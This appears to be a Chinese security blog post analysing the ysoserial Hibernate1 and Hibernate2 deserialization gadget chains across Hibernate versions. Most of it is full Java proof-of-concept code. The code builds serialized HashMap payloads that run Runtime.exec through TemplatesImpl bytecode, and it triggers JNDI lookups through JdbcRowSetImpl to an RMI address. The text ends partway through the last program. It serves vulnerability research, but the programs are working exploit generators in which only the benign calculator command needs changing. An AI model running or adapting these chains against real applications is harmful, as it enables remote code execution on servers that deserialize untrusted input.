[{"content":"hibernate组件的反序列化漏洞 hibernate是基于Java开发的一个ORM（对象关系映射）框架，通过将Java对象与数据库进行映射，简化了数据库操作。\n算是一个比较常见的组件，比如常见的SSH（Struts、Spring和Hibernate）框架就使用了这个。\n但是这里主要来谈谈这个组件存在的反序列化漏洞，在一定的版本下可以打TemplatesImpl的动态加载字节码和打jndi漏洞。\n在ysoserial中提到了两条利用链，对应上述的两个利用方法，下面来分别分析一下调用链的过程。\n分析环境：jdk8u71\nhibernate1链 ysoserial中给出了如下注释：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 /** * * org.hibernate.property.access.spi.GetterMethodImpl.get() * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue() * org.hibernate.type.ComponentType.getPropertyValue(C) * org.hibernate.type.ComponentType.getHashCode() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.engine.spi.TypedValue$1.initialize() * org.hibernate.internal.util.ValueHolder.getValue() * org.hibernate.engine.spi.TypedValue.hashCode() * * * Requires: * - Hibernate (\u0026gt;= 5 gives arbitrary method invocation, \u0026lt;5 getXYZ only) * * @author mbechler */ 说明了版本问题，在hibernate\u0026gt;=5的情况下可以调用任意方法，在\u0026lt;5时就只能调用getter方法。还给出了基本的调用栈，现在就不同版本来分析一下调用链。\nhibernate\u0026gt;=5 添加依赖如下：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.6.15.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 链子分析 先来简单跟一遍这里链子的过程，然后在自己尝试构造poc，起点是TypedValue类的hashCode()方法：\n想要调用到这里的TypedValue类的hasoCode()方法，我们在反序列化时直接使用HashMap或者Hashtable作为入口类即可。\n那么关于这里的hashcode变量，在TypedValue类初始化时就会确定：\n跟进调用的initTransients()方法：\n可以看到直接将hashcode变量定义为了ValueHolder类实例，并且在ValueHolder类初始化时定义了一个匿名内部类作为初始化的传参，这个匿名类还实现了initialize()方法。\n回到TypedValue类的hashCode()方法，那么此时就会调用ValueHolder类的getValue()方法：\n可以看出刚好就会调用初始化传参的匿名类的initialize()方法：\n在这里需要控制type为org.hibernate.type.ComponentType类对象，跟进ComponentType类的getHashCode()方法：\n再跟进这里调用的getPropertyValue()方法：\n这里需要控制调用到的是抽象类AbstractComponentTuplizer的getPropertyValue()方法：\n故直接找AbstractComponentTuplizer的实现类即可：\n简单看了一下流程，这里的DynamicMapComponentTuplizer应该是利用不了的，除非结合到cc依赖中的lazymap可能有点搞头，故这里主要利用的还是PojoComponentTuplizer类来作为实例化为对象的点。\n最后在AbstractComponentTuplizer了抽象类的getPropertyValue()方法中控制getter为GetterMethodImpl类，从而调用到它的get()方法：\n由此可实现方法的调用，并且确实从这里看来，只要我们能到达GetterMethodImpl类的get()方法：\n只要控制owner和getterMethod，就可以实现任意方法调用。\n由此链子已经通了，来尝试构造一下poc。\n链子构造 在尝试构造时，其中更有一个绕不过的点就是需要用到的类的初始化，但是这些类的初始化需要的类很多，比如Component的初始化：\n等等，这样一层一层套下去，需要考虑以及寻找符合条件的类就非常多，但是其实本质我们就只需要控制对应的变量即可，如何初始化类成了一个需要考虑的大问题，发愁呀。\n在这里需要用到了一个非常好用的类：ReflectionFactory类。通过调用这个类的一些方法，可以达到不调用其他类的构造方法而直接对其他类实例化对象。\n故我们可以使用这个类来实例化一个对象，然后按需求修改这个类的白亮来达到想要的目的。\n故现在可以构造如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.type.ComponentType; import org.hibernate.tuple.component.PojoComponentTuplizer; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;getOutputProperties\u0026#34;)); //part2 Class pojoComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.PojoComponentTuplizer\u0026#34;); PojoComponentTuplizer pojoComponentTuplizer = (PojoComponentTuplizer) getObject(pojoComponentTuplizerClass); setFieldValue(pojoComponentTuplizer, \u0026#34;getters\u0026#34;, getterMethodImpl); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, pojoComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, tem); typedValue.hashCode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } 运行成功弹出计算机，并且调试符合链子分析的过程。ReflectionFactory类是真好用啊，让我们可以只专注于类中的变量的赋值情况，而不用去管类的构造函数需要满足的一些类（并且这样的话其实也可以用另一个实现类DynamicMapComponentTuplizer了，不用专注于PojoComponentTuplizer类的构造）。\n难度不难，搞清楚参数传递即可，这里就一个点值得说一下： 由于要修改的AbstractComponentTuplizer抽象类的变量getters，故修改了一下常规的setFieldValue()方法，当成功赋值后就会将clazz赋值为null，从而跳出循环。\n其次就是提到的任意方法，个人认为是任意无参方法调用，比如我们还可以直接调用newTransformer()方法： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import org.hibernate.tuple.component.PojoComponentTuplizer; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, tem); typedValue.hashCode(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } 运行也是弹出计算机。如上java代码即可验证DynamicMapComponentTuplizer+newTransformer的任意无参数方法调用。\n将其序列化生成数据，如之前所说将HashMap当作入口类即可，但是还有一个问题就是对HashMap调用put()方法放入键值对时会对key调用hashCode()方法，由此会造成一次调用链的进行，故需要避免这个问题。\n有几种解决方法，比如修改HashMap中的哈希表等，但是还有一种解决方法就是先正常往HashMap放入无害的TypedValue类实例，然后反射修改，其实在前面很多条链子我们都是利用到过这个思想来绕过序列化前弹出计算机的。故最后的POC如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;newTransformer\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,tem); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } 成功在反序列化时弹出计算机。由此在序列化前，在如下地方即会停止调用链的进行：\n就可以只在反序列化时弹出计算机了。\n注意：在目前最新版7.1.1包的位置又改了，具体在5\u0026lt;=hibernate\u0026lt;?，到时候遇到高版本再测吧，感觉应该是在5版本以内的才是可以都打的。\nhibernate\u0026lt;5 将版本改成如下即可：\n1 2 3 4 5 6 \u0026lt;!-- https://mvnrepository.com/artifact/org.hibernate/hibernate-core --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.hibernate\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hibernate-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.3.11.Final\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 再低版本中，也是修改了包的位置，相比于\u0026gt;=5的版本，删除或增加了一些类。\n比如原先的\u0026gt;=5的链子，就报了如下的错误：\n少了GetterMethodImpl，导致无法调用到对应类的方法。但是ysoserial也是提出了另外的解决方法：\n找到了平替的内部类BasicGetter，跟进其get()方法：\n一样的，可以调用无参方法，但是可以注意到这里的Method为transient，序列化时会忽略这个字段。\n同时这个内部类还实现了一个readResolve()方法：\n这个方法是在对象反序列化时自定义返回的对象实例，也就是说通过readResolve()方法来生成一个BasicGetter类实例，跟进createGetter()方法：\n可以看出是生成一个BasicGetter类实例作为后续操作的类对象，跟进getGetterOrNull()方法：\n会调用getterMethod()方法来获取Method，如果method不为空就会实例化并返回BasicGetter类对象。\n再跟进getterMethod()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private static Method getterMethod(Class theClass, String propertyName) { Method[] methods = theClass.getDeclaredMethods(); for ( Method method : methods ) { // if the method has parameters, skip it if ( method.getParameterTypes().length != 0 ) { continue; } // if the method is a \u0026#34;bridge\u0026#34;, skip it if ( method.isBridge() ) { continue; } final String methodName = method.getName(); // try \u0026#34;get\u0026#34; if ( methodName.startsWith( \u0026#34;get\u0026#34; ) ) { String testStdMethod = Introspector.decapitalize( methodName.substring( 3 ) ); String testOldMethod = methodName.substring( 3 ); if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) { return method; } } // if not \u0026#34;get\u0026#34;, then try \u0026#34;is\u0026#34; if ( methodName.startsWith( \u0026#34;is\u0026#34; ) ) { String testStdMethod = Introspector.decapitalize( methodName.substring( 2 ) ); String testOldMethod = methodName.substring( 2 ); if ( testStdMethod.equals( propertyName ) || testOldMethod.equals( propertyName ) ) { return method; } } } return null; } 可以看到获取了Clas对象的所有方法，然后进行了判断，要求参数个数为0，然后可以获取到get或is开头的方法，但这里需要控制一下propertyName这个值从而可以获取到想要的值，故我们可以构造poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.BasicPropertyAccessor; import org.hibernate.property.Getter; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(tem, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); //part1 Class basicGetterClazz = Class.forName(\u0026#34;org.hibernate.property.BasicPropertyAccessor$BasicGetter\u0026#34;); BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter)getObject(basicGetterClazz); setFieldValue(basicGetter, \u0026#34;method\u0026#34;, tem.getClass().getDeclaredMethod(\u0026#34;getOutputProperties\u0026#34;)); setFieldValue(basicGetter, \u0026#34;clazz\u0026#34;, tem.getClass()); setFieldValue(basicGetter, \u0026#34;propertyName\u0026#34;, \u0026#34;OutputProperties\u0026#34;); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{basicGetter}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,tem); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } 运行即可弹出计算机。但是更低版本如3的版本似乎是不能打的，也就是也是局限在4这个版本内？具体就到时候在看吧。\n并且从上面不同版本的两条链子的分析，也就知道了为什么\u0026lt;5只能打getter，而\u0026gt;=5却可以打任意无参构造方法。\n————————————————\nhibernate2链 其实就是打一个jndi，打的JdbcRowSetImpl类下的getDatabaseMetaData()方法，其中调用的connect()方法存在jndi漏洞并且参数可控：\n在rome链就提到过这个打法。ysoserial也是给出了基本的调用栈，这也没啥好说的，在前面可以直接打getter，但是我想到在hibernate\u0026gt;=5的情况下是否可以直接打connect()方法呢，其是一个无参方法。\n先给出hibernate\u0026lt;5下的getter打jndi的poc：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.rowset.JdbcRowSetImpl; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.BasicPropertyAccessor; import org.hibernate.property.Getter; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); //part1 Class basicGetterClazz = Class.forName(\u0026#34;org.hibernate.property.BasicPropertyAccessor$BasicGetter\u0026#34;); BasicPropertyAccessor.BasicGetter basicGetter = (BasicPropertyAccessor.BasicGetter)getObject(basicGetterClazz); // setFieldValue(basicGetter, \u0026#34;method\u0026#34;, jdbcRowSet.getClass().getDeclaredMethod(\u0026#34;getDatabaseMetaData\u0026#34;)); setFieldValue(basicGetter, \u0026#34;clazz\u0026#34;, jdbcRowSet.getClass()); setFieldValue(basicGetter, \u0026#34;propertyName\u0026#34;, \u0026#34;databaseMetaData\u0026#34;); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{basicGetter}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,jdbcRowSet); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); constructor.setAccessible(true); return constructor.newInstance(); } } 打jndi成功弹出计算机：\n————————————\n尝试构造hibernate\u0026gt;=5下的打connect()方法的poc：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 package org.example; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.HashMap; import com.sun.rowset.JdbcRowSetImpl; import org.hibernate.engine.spi.TypedValue; import org.hibernate.property.access.spi.Getter; import org.hibernate.property.access.spi.GetterMethodImpl; import org.hibernate.tuple.component.DynamicMapComponentTuplizer; import org.hibernate.type.ComponentType; import sun.reflect.ReflectionFactory; public class Main { public static void main(String[] args) throws Exception { //定义恶意的字节码 JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); //part1 Class getterMethodImplClazz = Class.forName(\u0026#34;org.hibernate.property.access.spi.GetterMethodImpl\u0026#34;); GetterMethodImpl getterMethodImpl = (GetterMethodImpl)getObject(getterMethodImplClazz); setFieldValue(getterMethodImpl, \u0026#34;getterMethod\u0026#34;, jdbcRowSet.getClass().getDeclaredMethod(\u0026#34;connect\u0026#34;)); //part2 Class dynamicMapComponentTuplizerClass = Class.forName(\u0026#34;org.hibernate.tuple.component.DynamicMapComponentTuplizer\u0026#34;); DynamicMapComponentTuplizer dynamicMapComponentTuplizer = (DynamicMapComponentTuplizer) getObject(dynamicMapComponentTuplizerClass); setFieldValue(dynamicMapComponentTuplizer, \u0026#34;getters\u0026#34;, new Getter[]{getterMethodImpl}); //part3 Class componentTypeClass = Class.forName(\u0026#34;org.hibernate.type.ComponentType\u0026#34;); ComponentType componentType = (ComponentType) getObject(componentTypeClass); setFieldValue(componentType, \u0026#34;propertySpan\u0026#34;, 1); setFieldValue(componentType, \u0026#34;componentTuplizer\u0026#34;, dynamicMapComponentTuplizer); //part4 TypedValue typedValue = new TypedValue(componentType, null); HashMap hashMap = new HashMap(); hashMap.put(typedValue,\u0026#34;fupanc\u0026#34;); setFieldValue(typedValue,\u0026#34;value\u0026#34;,jdbcRowSet); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hashMap); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); clazz = null; } catch (Exception e) { clazz = clazz.getSuperclass(); } } } public static Object getObject(Class clazz) throws Exception { ReflectionFactory reflectionFactory = ReflectionFactory.getReflectionFactory(); Constructor constructor = reflectionFactory.newConstructorForSerialization(clazz,Object.class.getDeclaredConstructor()); 